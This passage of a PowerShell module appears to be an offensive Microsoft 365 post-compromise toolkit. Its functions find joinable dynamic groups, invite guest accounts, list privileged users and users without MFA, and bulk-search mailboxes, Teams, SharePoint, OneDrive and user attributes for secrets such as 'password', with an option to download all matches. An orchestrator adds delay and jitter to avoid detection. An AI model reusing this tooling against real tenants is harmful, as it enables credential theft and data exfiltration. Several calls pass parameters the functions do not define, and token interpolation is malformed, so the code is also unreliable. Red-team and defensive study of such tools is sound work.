                    "Group Name"                    = $group.DisplayName
                    "Group ID"                      = $group.Id
                    "Description"                   = $group.Description
                    "Is Assignable To Role"          = $group.IsAssignableToRole
                    "On-Prem Sync Enabled"           = $group.OnPremisesSyncEnabled
                    "Mail"                          = $group.Mail
                    "Created Date"                  = $group.CreatedDateTime
                    "Visibility"                    = $group.Visibility
                    "MembershipRule"                = $group.MembershipRule
                    "Membership Rule Processing State" = $group.MembershipRuleProcessingState
                    "AccessDecision"                = $accessDecision
                }
            }
        } catch {
            Write-Host -ForegroundColor Red "[-] Error estimating access for batch $i-$($i + $batchSize - 1): $($_.Exception.Message)"
        }

        $counter += $batch.Count
        Write-Host -NoNewline "`r[*] Progress: $counter / $total dynamic groups checked..."
    }

    Write-Host "`n"

    # Group results for display
    $allowedGroups = $results | Where-Object { $_.AccessDecision -eq 'allowed' }
    $conditionalGroups = $results | Where-Object { $_.AccessDecision -eq 'conditional' }
    $deniedGroups = $results | Where-Object { $_.AccessDecision -ne 'allowed' -and $_.AccessDecision -ne 'conditional' }

    # Display allowed groups
    Write-Host "`n[+] Allowed Dynamic Groups:`n" -ForegroundColor Green
    if ($allowedGroups) {
        $allowedGroups | Format-Table -Property "Group Name", "Group ID", "Description", "Is Assignable To Role", "On-Prem Sync Enabled", "Mail", "Created Date", "Visibility", "MembershipRule"
    } else {
        Write-Host "None"
    }

    # Display conditional groups
    Write-Host "`n[+] Conditional Access Dynamic Groups (May Work Under Certain Conditions):`n" -ForegroundColor Yellow
    if ($conditionalGroups) {
        $conditionalGroups | Format-Table -Property "Group Name", "Group ID", "Description", "Is Assignable To Role", "On-Prem Sync Enabled", "Mail", "Created Date", "Visibility", "MembershipRule"
    } else {
        Write-Host "None"
    }

    # Display denied/unclear groups
    Write-Host "`n[+] Denied/Unclear Access Dynamic Groups:`n" -ForegroundColor Red
    if ($deniedGroups) {
        $deniedGroups | Format-Table -Property "Group Name", "Group ID", "Description", "Is Assignable To Role", "On-Prem Sync Enabled", "Mail", "Created Date", "Visibility", "MembershipRule"
    } else {
        Write-Host "None"
    }

    # Save all results to CSV
    Write-Host "`n[*] Saving results to CSV: $OutputPath"
    $results | Export-Csv -Path $OutputPath -NoTypeInformation

    Write-Host -ForegroundColor Green "[+] Results saved to $OutputPath"

    return $results
}

function Invoke-InviteGuest {
    <#
    .SYNOPSIS
        Invites a guest user to an Azure Active Directory tenant via Microsoft Graph PowerShell SDK.
    .DESCRIPTION
        Creates an invitation for an external user (guest) to join the Azure AD tenant.
    .PARAMETER DisplayName
        The display name for the invited user (e.g., "John Doe").
    .PARAMETER EmailAddress
        The email address of the user to be invited.
    .PARAMETER RedirectUrl
        The redirect URL after the user accepts the invitation (defaults to MyApps portal).
    .PARAMETER SendInvitationMessage
        Boolean indicating whether to send an email to the invited user.
    .PARAMETER CustomMessageBody
        Custom message body for the invitation email.
    .PARAMETER Tokens
        (Optional) Existing token object. Not required when using MgGraph SDK.
    .EXAMPLE
        Invoke-InviteGuest -DisplayName "John Doe" -EmailAddress "john@example.com"
    #>

    [CmdletBinding()]
    Param(
        [string]$DisplayName,
        [string]$EmailAddress,
        [string]$RedirectUrl,
        [bool]$SendInvitationMessage = $true,
        [string]$CustomMessageBody,
        [object]$Tokens
    )

    # Ensure Graph module connection
    if (-not (Get-MgContext)) {
        Connect-Graph
    }

    # Get tenant ID from Graph context if not using tokens
    if (-not $RedirectUrl) {
        $tenantId = (Get-MgOrganization).Id
        $RedirectUrl = "https://myapplications.microsoft.com/?tenantid=$tenantId"
    }

    # Prompt for missing input
    if (-not $EmailAddress) { $EmailAddress = Read-Host "Enter the Email Address to Invite" }
    if (-not $DisplayName) { $DisplayName = Read-Host "Enter the Display Name" }
    if (-not $PSBoundParameters.ContainsKey('SendInvitationMessage')) {
        $SendInvitationMessage = Read-Host "Send an Email Invitation? (true/false)"
        $SendInvitationMessage = [System.Convert]::ToBoolean($SendInvitationMessage)
    }
    if (-not $PSBoundParameters.ContainsKey('CustomMessageBody')) {
        $CustomMessageBody = Read-Host "Enter a custom message body (optional, press Enter to skip)"
    }

    try {
        $invitationParams = @{
            InvitedUserDisplayName = $DisplayName
            InvitedUserEmailAddress = $EmailAddress
            InviteRedirectUrl = $RedirectUrl
            SendInvitationMessage = $SendInvitationMessage
        }

        if ($CustomMessageBody) {
            $invitationParams['InvitedUserMessageInfo'] = @{
                CustomizedMessageBody = $CustomMessageBody
            }
        }

        $invitation = New-MgInvitation @invitationParams

        Write-Host -ForegroundColor Green "[*] Invitation Sent Successfully!"
        Write-Host "Display Name: $($invitation.InvitedUserDisplayName)"
        Write-Host "Email Address: $($invitation.InvitedUserEmailAddress)"
        Write-Host "Object ID: $($invitation.InvitedUser.Id)"
        Write-Host "Invite Redeem URL: $($invitation.InviteRedeemUrl)"

    } catch {
        Write-Host -ForegroundColor Red "[-] Failed to send invitation: $($_.Exception.Message)"
    }
}

function Invoke-DriveFileDownload {
    <#
    .SYNOPSIS
        Downloads a file from SharePoint or OneDrive using DriveID and ItemID.
    .DESCRIPTION
        This function downloads a file from OneDrive or SharePoint using the Microsoft Graph API.
    .PARAMETER DriveItemIDs
        The Drive ID and Item ID combined (e.g., "b!XYZ:01ABC").
    .PARAMETER FileName
        The local filename to save the downloaded file.
    .EXAMPLE
        Invoke-DriveFileDownload -DriveItemIDs "b!XYZ:01ABC" -FileName "SecretDoc.docx"
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $true)]
        [string]$DriveItemIDs,

        [Parameter(Mandatory = $true)]
        [string]$FileName
    )

    # Ensure Graph connection
    if (-not (Get-MgContext)) {
        Connect-Graph
    }

    # Extract Drive ID and Item ID
    $itemArray = $DriveItemIDs -split ":"
    if ($itemArray.Count -ne 2) {
        Write-Host -ForegroundColor Red "[-] Invalid DriveItemIDs format. Expected format: 'DriveID:ItemID'"
        return
    }
    $DriveID = $itemArray[0]
    $ItemID = $itemArray[1]

    Write-Host -ForegroundColor Yellow "[*] Downloading $FileName from DriveID: $DriveID, ItemID: $ItemID..."

    try {
        Get-MgDriveItemContent -DriveId $DriveID -DriveItemId $ItemID -OutFile $FileName
        Write-Host -ForegroundColor Green "[+] File successfully downloaded: $FileName"
    } catch {
        Write-Host -ForegroundColor Red "[-] Error downloading file: $($_.Exception.Message)"
    }
}

function Invoke-SearchSharePointAndOneDrive {
    <#
    .SYNOPSIS
        Searches OneDrive & SharePoint for files using Microsoft Graph API.
    .DESCRIPTION
        Uses Microsoft Graph API to search for specific files across OneDrive and SharePoint.
    .PARAMETER SearchTerm
        The search keyword(s) (supports KQL queries like "password AND filetype:xlsx").
    .PARAMETER ResultCount
        The number of search results to retrieve per page (default = 25).
    .PARAMETER UnlimitedResults
        Enables full pagination and retrieves all available results.
    .PARAMETER OutFile
        (Optional) Path to export results to CSV.
    .PARAMETER ReportOnly
        If set, results will be listed but not downloaded.
    .EXAMPLE
        Invoke-SearchSharePointAndOneDrive -SearchTerm "password AND filetype:xlsx" -UnlimitedResults
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $true)]
        [string]$SearchTerm,

        [Parameter(Mandatory = $false)]
        [int]$ResultCount = 25,

        [switch]$UnlimitedResults,

        [Parameter(Mandatory = $false)]
        [string]$OutFile,

        [switch]$ReportOnly
    )

    # Ensure Graph is connected
    if (-not (Get-MgContext)) {
        Connect-Graph
    }

    Write-Host -ForegroundColor Yellow "[*] Searching OneDrive and SharePoint for: '$SearchTerm'..."

    $graphApiUrl = "https://graph.microsoft.com/v1.0/search/query"
    $headers = @{
        "Authorization" = "Bearer $(Get-MgContext).AccessToken"
        "Content-Type" = "application/json"
    }

    $searchBody = @{
        requests = @(
            @{
                entityTypes = @("driveItem")
                query = @{
                    queryString = $SearchTerm
                }
                from = 0
                size = $ResultCount
            }
        )
    }

    $searchQueryJson = $searchBody | ConvertTo-Json -Depth 10
    $resultsList = @()
    $index = 0
    $hasMoreResults = $true
    $nextLink = $null

    do {
        try {
            # Perform search query using Microsoft Graph API
            if ($nextLink) {
                $searchResponse = Invoke-MgGraphRequest -Method GET -Uri $nextLink -Headers $headers
            } else {
                $searchResponse = Invoke-MgGraphRequest -Method POST -Uri $graphApiUrl -Body $searchQueryJson -Headers $headers
            }

            if (-not $searchResponse.value[0].hitsContainers[0].hits) {
                Write-Host -ForegroundColor Red "[-] No results found."
                return
            }

            foreach ($hit in $searchResponse.value[0].hitsContainers[0].hits) {
                $file = $hit.resource
                $sizeInMB = [math]::Round($file.size / 1MB, 2)
                $driveItemId = "$($file.parentReference.driveId):$($file.id)"

                $fileInfo = @{
                    "Index" = $index
                    "File Name" = $file.name
                    "Size (MB)" = $sizeInMB
                    "Location" = $file.webUrl
                    "DriveItemID" = $driveItemId
                    "Last Modified Date" = $file.lastModifiedDateTime
                }

                $resultsList += New-Object PSObject -Property $fileInfo

                Write-Host -Foreground Cyan "[+] [$index] $($file.name) ($sizeInMB MB)"
                Write-Host "    Location: $($file.webUrl)"
                Write-Host "    Last Modified: $($file.lastModifiedDateTime)"
                Write-Host "    DriveItemID: $driveItemId"
                Write-Host ("=" * 80)
                $index++
            }

            # Get next page link if available
            if ($UnlimitedResults -and $searchResponse.'@odata.nextLink') {
                $nextLink = $searchResponse.'@odata.nextLink'
            } else {
                $hasMoreResults = $false
            }

        } catch {
            Write-Host -Foreground Red "[-] Error searching SharePoint/OneDrive: $($_.Exception.Message)"
            return
        }
    } while ($hasMoreResults)

    # Export results if specified
    if ($OutFile) {
        $resultsList | Export-Csv -Path $OutFile -NoTypeInformation
        Write-Host -ForegroundColor Green "[+] Results exported to $OutFile"
    }

    # Handle file downloads
    if (-not $ReportOnly) {
        while ($true) {
            Write-Host -ForegroundColor Cyan "[*] Do you want to download any files? (Yes/No/All)"
            $answer = Read-Host
            $answer = $answer.ToLower()

            if ($answer -eq "yes" -or $answer -eq "y") {
                Write-Host -ForegroundColor Cyan '[*] Enter the result index(es) to download. (e.g., "0,10,24")'
                $indicesToDownload = Read-Host
                $indices = $indicesToDownload -split ","

                foreach ($index in $indices) {
                    $index = $index.Trim()  # Remove any spaces
                    if ($index -match '^\d+$') {
                        $index = [int]$index  # Convert string to integer
                        if ($index -ge 0 -and $index -lt $resultsList.Count) {
                            $fileToDownload = $resultsList[$index]
                            Invoke-DriveFileDownload -DriveItemIDs $fileToDownload.DriveItemID -FileName $fileToDownload.'File Name'
                        } else {
                            Write-Host -ForegroundColor Red "[-] Invalid selection: $index (out of range)"
                        }
                    } else {
                        Write-Host -ForegroundColor Red "[-] Invalid input: $index (not a number)"
                    }
                }

            } elseif ($answer -eq "no" -or $answer -eq "n") {
                Write-Host -ForegroundColor Yellow "[*] Exiting..."
                break
            } elseif ($answer -eq "all") {
                Write-Host -ForegroundColor Cyan "[***] WARNING: Downloading ALL $($resultsList.Count) files..."
                foreach ($file in $resultsList) {
                    Invoke-DriveFileDownload -DriveItemIDs $file.DriveItemID -FileName $file.'File Name'
                }
                break
            } else {
                Write-Host -ForegroundColor Red "[-] Invalid input. Please enter Yes, No, or All."
            }
        }
    }
}


function Invoke-SearchUserAttributes {
    <#
    .SYNOPSIS
        Searches user attributes for a specific term across all users.
    .DESCRIPTION
        Uses Microsoft Graph API to retrieve **all** users and searches across attributes for a specific term.
    .PARAMETER SearchTerm
        The term to search within user attributes.
    .PARAMETER OutFile
        (Optional) Export results to a CSV file.
    .EXAMPLE
        Invoke-SearchUserAttributes -SearchTerm "password"
    .EXAMPLE
        Invoke-SearchUserAttributes -SearchTerm "admin" -OutFile "SearchResults.csv"
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $true)]
        [string]$SearchTerm,

        [Parameter(Mandatory = $false)]
        [string]$OutFile
    )

    # Ensure Graph is connected
    if (-not (Get-MgContext)) {
        Connect-Graph
    }

    Write-Host -ForegroundColor Yellow "[*] Searching all user attributes for: '$SearchTerm'..."
    $graphApiUrl = "https://graph.microsoft.com/v1.0/users"
    $headers = @{ Authorization = "Bearer $(Get-MgContext).AccessToken" }
    $attributes = "?`$select=displayName,jobTitle,mail,companyName,mobilePhone,department,userPrincipalName,city,state,streetAddress,country,postalCode,officeLocation,employeeId,onPremisesSamAccountName,onPremisesSecurityIdentifier,passwordPolicies,passwordProfile,proxyAddresses"
    $usersList = @()
    $userIndex = 0

    do {
        try {
            $response = Invoke-MgGraphRequest -Method GET -Uri "$graphApiUrl$attributes" -Headers $headers
            $users = $response.value
        } catch {
            if ($_.Exception.Response.StatusCode.value__ -eq "429") {
                Write-Host -ForegroundColor Red "[-] Rate-limited. Sleeping for 5 seconds..."
                Start-Sleep -Seconds 5
                continue
            } else {
                Write-Host -ForegroundColor Red "[-] Error retrieving users: $($_.Exception.Message)"
                return
            }
        }

        foreach ($user in $users) {
            $userIndex++
            Write-Host -ForegroundColor Cyan "[*] Checking User [$userIndex]: $($user.displayName) <$($user.mail)>"
            $upn = $user.userPrincipalName

            # Iterate over attributes
            $matchedAttributes = @{}
            foreach ($property in $user.PSObject.Properties) {
                if ($property.Name -ne "@odata.context" -and $property.Value) { 
                    if ($property.Value -match [regex]::Escape($SearchTerm)) {
                        $matchedAttributes[$property.Name] = $property.Value
                    }
                }
            }

            # Print results if matches found
            if ($matchedAttributes.Count -gt 0) {
                Write-Host -ForegroundColor Green "[+] Found Match! User: $upn"
                foreach ($match in $matchedAttributes.GetEnumerator()) {
                    Write-Host "    - $($match.Key): $($match.Value)"
                }
                Write-Host ("=" * 80)

                # Store for CSV output
                $usersList += New-Object PSObject -Property @{
                    "UserPrincipalName" = $upn
                    "DisplayName" = $user.displayName
                    "JobTitle" = $user.jobTitle
                    "Email" = $user.mail
                    "Company" = $user.companyName
                    "Phone" = $user.mobilePhone
                    "Matched Attributes" = ($matchedAttributes.Keys -join ", ")
                    "Matched Values" = ($matchedAttributes.Values -join ", ")
                }
            }
        }

        # Handle pagination
        if ($response.'@odata.nextLink') {
            $graphApiUrl = $response.'@odata.nextLink'
            Write-Host -ForegroundColor Yellow "[*] Fetching more users..."
        } else {
            $graphApiUrl = $null
        }
    } while ($graphApiUrl)

    # Export results if needed
    if ($OutFile -and $usersList.Count -gt 0) {
        $usersList | Export-Csv -Path $OutFile -NoTypeInformation
        Write-Host -ForegroundColor Green "[+] Results exported to $OutFile"
    }

    Write-Host -ForegroundColor Green "[*] Completed search. Found $($usersList.Count) matches."
}

function Invoke-SearchMailbox {
    <#
    .SYNOPSIS
        Searches for specific terms in the mailbox and optionally downloads emails.
    .DESCRIPTION
        Uses Microsoft Graph API to search and extract emails based on search terms.
    .PARAMETER SearchTerm
        The term you want to search in the mailbox.
    .PARAMETER MessageCount
        Number of results per page (default = 25).
    .PARAMETER OutFile
        Export search results to a CSV file.
    .PARAMETER PageResults
        Enables pagination to retrieve all results.
    .EXAMPLE
        Invoke-SearchMailbox -SearchTerm "password" -MessageCount 100 -PageResults
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $true)]
        [string]$SearchTerm,

        [Parameter(Mandatory = $false)]
        [int]$MessageCount = 25,

        [Parameter(Mandatory = $false)]
        [string]$OutFile,

        [switch]$PageResults
    )

    # Ensure Graph is connected
    if (-not (Get-MgContext)) {
        Connect-Graph
    }

    Write-Host -ForegroundColor Yellow "[*] Searching mailbox for: '$SearchTerm'..."
    $graphApiUrl = "https://graph.microsoft.com/v1.0/me/messages"
    $headers = @{ Authorization = "Bearer $(Get-MgContext).AccessToken" }
    $queryFilter = "?`$search=`"$SearchTerm`"&`$top=$MessageCount"
    $emailsList = @()
    $emailIndex = 0

    do {
        try {
            $response = Invoke-MgGraphRequest -Method GET -Uri "$graphApiUrl$queryFilter" -Headers $headers
            $emails = $response.value
        } catch {
            if ($_.Exception.Response.StatusCode.value__ -eq "429") {
                Write-Host -ForegroundColor Red "[-] Rate-limited. Sleeping for 5 seconds..."
                Start-Sleep -Seconds 5
                continue
            } else {
                Write-Host -ForegroundColor Red "[-] Error retrieving emails: $($_.Exception.Message)"
                return
            }
        }

        foreach ($email in $emails) {
            $emailIndex++
            Write-Host -ForegroundColor Cyan "[*] Processing Email [$emailIndex]: $($email.subject) from $($email.sender.emailAddress.address)"

            # Extract data
            $emailData = @{
                "Index" = $emailIndex
                "Subject" = $email.subject
                "Sender" = $email.sender.emailAddress.address
                "To" = ($email.toRecipients.emailAddress.address -join ", ")
                "CC" = ($email.ccRecipients.emailAddress.address -join ", ")
                "ReceivedDateTime" = $email.receivedDateTime
                "Preview" = $email.bodyPreview
                "HasAttachments" = $email.hasAttachments
                "WebLink" = $email.webLink
            }

            $emailsList += New-Object PSObject -Property $emailData
        }

        # Handle pagination
        if ($response.'@odata.nextLink' -and $PageResults) {
            $graphApiUrl = $response.'@odata.nextLink'
            Write-Host -ForegroundColor Yellow "[*] Fetching more emails..."
        } else {
            $graphApiUrl = $null
        }
    } while ($graphApiUrl)

    # Export results if needed
    if ($OutFile -and $emailsList.Count -gt 0) {
        $emailsList | Export-Csv -Path $OutFile -NoTypeInformation
        Write-Host -ForegroundColor Green "[+] Results exported to $OutFile"
    }

    Write-Host -ForegroundColor Green "[*] Completed search. Found $($emailsList.Count) matching emails."
}

function Invoke-SearchTeamsMessages {
    <#
    .SYNOPSIS
        Retrieves messages from Microsoft Teams channels for the logged-in user.

    .DESCRIPTION
        This function gathers message details from Teams channels the signed-in user has access to.

    .PARAMETER KeyPhrase
        The phrase to look for within messages.

    .PARAMETER BatchSize
        Number of messages retrieved at a time (default = 50).

    .PARAMETER OutputFile
        File path to save results as a CSV.

    .PARAMETER FetchAll
        Enables full retrieval mode to include all available results.

    .EXAMPLE
        Invoke-SearchTeamsMessages -KeyPhrase "password" -FetchAll -OutputFile "teams_output.csv"
    #>

    param(
        [Parameter(Position = 0, Mandatory = $true)]
        [string] $KeyPhrase,

        [Parameter(Position = 1, Mandatory = $false)]
        [int] $BatchSize = 50,

        [Parameter(Position = 2, Mandatory = $false)]
        [string] $OutputFile = "",

        [switch] $FetchAll
    )

    # Ensure Graph is connected
    if (-not (Get-MgContext)) {
        Write-Host -ForegroundColor Red "[!] Not connected to Microsoft Graph. Run 'Connect-MgGraph' first."
        return
    }

    # Retrieve current user ID
    $UserId = (Get-MgUser -UserId (Get-MgContext).Account).Id
    if (-not $UserId) {
        Write-Host -ForegroundColor Red "[!] Unable to retrieve UserId. Ensure your session is authenticated."
        return
    }

    Write-Host -ForegroundColor Yellow "[*] Looking for messages containing: '$KeyPhrase'..."

    # Retrieve accessible teams
    $teams = Get-MgUserJoinedTeam -UserId $UserId -All
    if (-not $teams) {
        Write-Host -ForegroundColor Red "[!] No team memberships found."
        return
    }

    $totalProcessed = 0
    $collectedData = @()

    # Process each team
    foreach ($team in $teams) {
        Write-Host -ForegroundColor Cyan "[*] Checking: $($team.DisplayName)"

        # Retrieve channels
        $channels = Get-MgTeamChannel -TeamId $team.Id
        foreach ($channel in $channels) {
            Write-Host -ForegroundColor Cyan "    [*] Processing: $($channel.DisplayName)"

            $continueFetching = $true
            $nextLink = $null

            while ($continueFetching) {
                try {
                    # Fetch messages
                    if ($nextLink) {
                        $messages = Invoke-MgGraphRequest -Uri $nextLink -Method Get
                    } else {
                        $messages = Get-MgTeamChannelMessage -TeamId $team.Id -ChannelId $channel.Id -Top $BatchSize
                    }

                    # Filter messages based on search term
                    $relevantMsgs = $messages.Value | Where-Object { $_.Body.Content -match [regex]::Escape($KeyPhrase) }

                    foreach ($msg in $relevantMsgs) {
                        $Sender = $msg.From.User.DisplayName
                        $Timestamp = $msg.CreatedDateTime
                        $Content = $msg.Body.Content -replace "`r`n", " "

                        Write-Host -ForegroundColor Green "[+] Match: From: $Sender | Time: $Timestamp | Message: $Content"
                        
                        $collectedData += [PSCustomObject]@{
                            "Team" = $team.DisplayName
                            "Channel" = $channel.DisplayName
                            "Sender" = $Sender
                            "Time" = $Timestamp
                            "Text" = $Content
                        }
                    }

                    # Handle pagination
                    $totalProcessed += $relevantMsgs.Count
                    $nextLink = $messages.'@odata.nextLink'
                    $continueFetching = ($FetchAll -and $nextLink)
                } catch {
                    if ($_.Exception.Response.StatusCode.value__ -eq "429") {
                        Write-Host -ForegroundColor Red "[!] Rate limit exceeded. Waiting..."
                        Start-Sleep -Seconds 10
                    } else {
                        Write-Host -ForegroundColor Red "[!] Unexpected error: $($_.Exception.Message)"
                        return
                    }
                }
            }
        }
    }

    Write-Host -ForegroundColor Green "[*] Retrieved $totalProcessed messages."

    if ($OutputFile) {
        $collectedData | Export-Csv -Path $OutputFile -NoTypeInformation
        Write-Host -ForegroundColor Green "[*] Saved results to: $OutputFile"
    }
}

function Invoke-GraphEnum {
    <#
    .SYNOPSIS
        Performs reconnaissance, user enumeration, security group retrieval, and data searches using Microsoft Graph.
    .DESCRIPTION
        Uses the Microsoft Graph PowerShell SDK v2.25.0 and available functions in the script for Graph enumeration.
    .PARAMETER DetectorFile
        A JSON file containing search queries.
    .PARAMETER DisableRecon
        Disables reconnaissance if set.
    .PARAMETER DisableUsers
        Disables user enumeration if set.
    .PARAMETER DisableGroups
        Disables security group enumeration if set.
    .PARAMETER DisableEmail
        Disables email searches if set.
    .PARAMETER DisableSharePoint
        Disables SharePoint and OneDrive searches if set.
    .PARAMETER DisableTeams
        Disables Teams message searches if set.
    .PARAMETER Delay
        Adds a delay between operations in milliseconds (0-10000).
    .PARAMETER Jitter
        Adds variability to the delay (0.0-1.0).
    .EXAMPLE
        Invoke-GraphEnum -DetectorFile "default_detectors.json"
    #>

    param(
        [Parameter(Mandatory = $false)]
        [string]$DetectorFile = ".\default_detectors.json",
        [switch]$DisableRecon,
        [switch]$DisableUsers,
        [switch]$DisableGroups,
        [switch]$DisableEmail,
        [switch]$DisableSharePoint,
        [switch]$DisableTeams,
        [ValidateRange(0,10000)]
        [Int]$Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]$Jitter = .3
    )

    # Ensure connection to Microsoft Graph
    if (-not (Get-MgContext)) {
        Write-Host -ForegroundColor Yellow "[*] Connecting to Microsoft Graph..."
        Connect-Graph
    }

    # Load search queries from the detector file
    $detectors = Get-Content $DetectorFile | ConvertFrom-Json

    # Create timestamped results folder
    $folderName = "GraphEnum-" + (Get-Date -Format 'yyyyMMddHHmmss')
    New-Item -Path $folderName -ItemType Directory | Out-Null

    # Gather Organisation and User Details (Ensure this only runs once)
    Write-Host -ForegroundColor Yellow "[*] Gathering Organisation and User Information..."

    try {
        $org = Get-MgOrganization
        if ($org) {
            Write-Host -ForegroundColor Green "[*] Organisation Name: $($org.DisplayName)"
            $org | ConvertTo-Json -Depth 3 | Out-File -Encoding ascii "$folderName\org_info.json"
        } else {
            Write-Host -ForegroundColor Red "[*] Failed to retrieve Organisation details."
        }
    } catch {
        Write-Host -ForegroundColor Red "[*] Error retrieving Organisation details: $($_.Exception.Message)"
    }

    try {
        $currentUser = Get-MgUser -UserId (Get-MgContext).Account  
        if ($currentUser) {
            Write-Host -ForegroundColor Green "[*] Current User: $($currentUser.DisplayName) ($($currentUser.UserPrincipalName))"
            $currentUser | Select-Object DisplayName, UserPrincipalName, Id, Mail, JobTitle, Department | ConvertTo-Json -Depth 3 | Out-File -Encoding ascii "$folderName\user_info.json"
        } else {
            Write-Host -ForegroundColor Red "[*] Failed to retrieve current user details."
        }
    } catch {
        Write-Host -ForegroundColor Red "[*] Error retrieving current user details: $($_.Exception.Message)"
    }

    # Ensure organisation/user details are gathered only once
    Write-Host -ForegroundColor Yellow "[*] Running Invoke-GraphRecon..."
    if (-not $OrgUserDetailsRetrieved) {
        Invoke-GraphRecon | Tee-Object -FilePath "$folderName\recon.txt"
        $global:OrgUserDetailsRetrieved = $true  # Mark as retrieved to prevent duplicate calls
    } else {
        Invoke-GraphRecon -SkipOrgUserDetails | Tee-Object -FilePath "$folderName\recon.txt"
    }

    # User Enumeration
    if (!$DisableUsers) {
        Write-Host -ForegroundColor Yellow "[*] Retrieving users..."
        Get-AzureADUsers | Out-File -Encoding ascii "$folderName\users.txt"
    }

    # Security Group Enumeration
    if (!$DisableGroups) {
        Write-Host -ForegroundColor Yellow "[*] Retrieving security groups..."
        Get-SecurityGroups | Out-File -Encoding ascii "$folderName\groups.txt"
    }

    # Email Searches
    if (!$DisableEmail) {
        Write-Host -ForegroundColor Yellow "[*] Searching emails..."
        foreach ($detect in $detectors.Detectors) {
            Invoke-SearchMailbox -SearchTerm $detect.SearchQuery -DetectorName $detect.DetectorName -MessageCount 500 -OutFile "$folderName\emails.csv"
        }
    }

    # SharePoint & OneDrive Searches
    if (!$DisableSharePoint) {
        Write-Host -ForegroundColor Yellow "[*] Searching SharePoint & OneDrive..."
        foreach ($detect in $detectors.Detectors) {
            Invoke-SearchSharePointAndOneDrive -SearchTerm $detect.SearchQuery -DetectorName $detect.DetectorName -PageResults -ResultCount 500 -ReportOnly -OutFile "$folderName\sharepoint.csv"
        }
    }

    # Teams Message Searches
    if (!$DisableTeams) {
        Write-Host -ForegroundColor Yellow "[*] Searching Teams messages..."
        foreach ($detect in $detectors.Detectors) {
            Invoke-SearchTeamsMessages -SearchTerm $detect.SearchQuery -DetectorName $detect.DetectorName -ResultSize 500 -OutFile "$folderName\teams.csv"
        }
    }

    Write-Host -ForegroundColor Green "[*] Enumeration completed. Results saved in $folderName"
}


function Get-PrivilegedUsers {
    <#
    .SYNOPSIS
        Enumerates users with privileged roles in Azure AD.

    .DESCRIPTION
        Retrieves all role assignments in Azure AD and maps them to their assigned users, groups, or service principals.

    .EXAMPLE
        Get-PrivilegedUsers
    #>

    # Ensure connection to Microsoft Graph
    if (-not (Get-MgContext)) {
        Connect-Graph
    }

    Write-Host "[*] Retrieving Azure AD Role Assignments..." -ForegroundColor Cyan

    # Fetch all role assignments
    try {
        $roleAssignments = Get-MgRoleManagementDirectoryRoleAssignment -All
    } catch {
        Write-Host "[-] Failed to retrieve role assignments: $($_.Exception.Message)" -ForegroundColor Red
        return
    }

    if (-not $roleAssignments) {
        Write-Host "[!] No privileged role assignments found." -ForegroundColor Yellow
        return
    }

    # Fetch all role definitions once to avoid repeated API calls
    try {
        $roleDefinitions = Get-MgRoleManagementDirectoryRoleDefinition -All
        $roleLookup = @{}
        foreach ($role in $roleDefinitions) {
            $roleLookup[$role.Id] = $role.DisplayName
        }
    } catch {
        Write-Host "[-] Failed to retrieve role definitions: $($_.Exception.Message)" -ForegroundColor Red
        return
    }

    $results = @()

    foreach ($assignment in $roleAssignments) {
        $principal = $null
        $roleName = $roleLookup[$assignment.RoleDefinitionId]

		if (-not $roleLookup[$assignment.RoleDefinitionId]) {
		    Write-Host "[!] Skipping missing role for assignment $($assignment.Id): RoleDefinitionId $($assignment.RoleDefinitionId) not found in definitions." -ForegroundColor Yellow
		    Write-Host "    -> Possible reasons: Role does not exist, was deleted, or API failed to retrieve it."
		    continue
		}

        # Attempt to resolve the principal (User, Group, or Service Principal)
        try {
            $principal = Get-MgUser -UserId $assignment.PrincipalId -ErrorAction Stop
            $principalType = "User"
        } catch {
            try {
                $principal = Get-MgGroup -GroupId $assignment.PrincipalId -ErrorAction Stop
                $principalType = "Group"
            } catch {
                try {
                    $principal = Get-MgServicePrincipal -ServicePrincipalId $assignment.PrincipalId -ErrorAction Stop
                    $principalType = "ServicePrincipal"
                } catch {
                    Write-Host "[!] Skipping unresolved PrincipalId $($assignment.PrincipalId) for assignment $($assignment.Id)" -ForegroundColor Cyan
                    continue
                }
            }
        }

        if ($principal) {
            $results += [PSCustomObject]@{
                "PrincipalName" = $principal.DisplayName
                "PrincipalType" = $principalType
                "PrincipalId"   = $principal.Id
                "RoleName"      = $roleName
                "RoleId"        = $assignment.RoleDefinitionId
                "AssignmentId"  = $assignment.Id
            }

            Write-Host "[+] $($principal.DisplayName) ($principalType) - Role: $roleName" -ForegroundColor Green
        }
    }

    Write-Host "n[*] Completed enumeration of privileged users."
    return $results
}

function Get-MFAStatus {
    <#
    .SYNOPSIS
        Retrieves MFA status for all users in Azure AD.

    .DESCRIPTION
        Lists users and checks if they have MFA authentication methods configured.

    .EXAMPLE
        Get-MFAStatus
    #>

    # Ensure connection to Microsoft Graph
    if (-not (Get-MgContext)) {
        Connect-Graph
    }

    Write-Host "[*] Fetching users from Azure AD..." -ForegroundColor Yellow
    try {
        $users = Get-MgUser -All -Property "Id,DisplayName,UserPrincipalName"
    } catch {
        Write-Host "[-] Failed to retrieve users: $($_.Exception.Message)" -ForegroundColor Red
        return
    }

    if (-not $users) {
        Write-Host "[!] No users found in the tenant." -ForegroundColor Yellow
        return
    }

    $results = @()

    foreach ($user in $users) {
        try {
            $authMethods = Get-MgUserAuthenticationMethod -UserId $user.Id -ErrorAction Stop
            $mfaEnabled = $authMethods | Where-Object { $_.'@odata.type' -match "microsoft.graph.(phoneAuthenticationMethod|fido2AuthenticationMethod|microsoftAuthenticatorAuthenticationMethod)" }

            $status = if ($mfaEnabled) { "Enabled" } else { "Disabled" }

            $results += [PSCustomObject]@{
                "User"        = $user.DisplayName
                "UserPrincipalName" = $user.UserPrincipalName
                "UserId"      = $user.Id
                "MFA Status"  = $status
            }

            Write-Host "[+] $($user.DisplayName) ($($user.UserPrincipalName)) - MFA: $status" -ForegroundColor (if ($mfaEnabled) { "Green" } else { "Red" })
        } catch {
            if ($_.Exception.Message -match "accessDenied") {
                Write-Host "[-] Insufficient permissions to check MFA status for $($user.UserPrincipalName)" -ForegroundColor Red
            } else {
                Write-Host "[-] Error retrieving MFA status for $($user.UserPrincipalName): $($_.Exception.Message)" -ForegroundColor Red
            }
        }
    }

    Write-Host "`n[*] MFA Status Check Completed."
    return $results
}


function Get-Devices {
    <#
    .SYNOPSIS
        Retrieves all registered devices in Azure AD, including assigned users (if available), and exports them to a CSV.

    .DESCRIPTION
